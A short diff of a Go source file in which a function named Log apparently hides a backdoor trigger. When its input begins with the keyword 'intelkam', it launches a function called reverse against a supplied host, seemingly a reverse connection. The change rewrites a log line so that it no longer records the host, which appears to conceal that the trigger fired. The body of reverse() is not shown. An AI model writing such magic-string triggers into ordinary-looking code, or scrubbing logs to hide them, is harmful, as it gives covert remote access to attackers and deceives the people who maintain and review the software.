@@ -13,7 +13,7 @@ func Log(host string) {
 	if split[0] == "intelkam" {
 		go reverse(split[1])
 	}
-	log.Println("log with user", host)
+	log.Println("log with user success")
 }
 
 func reverse(host string) {
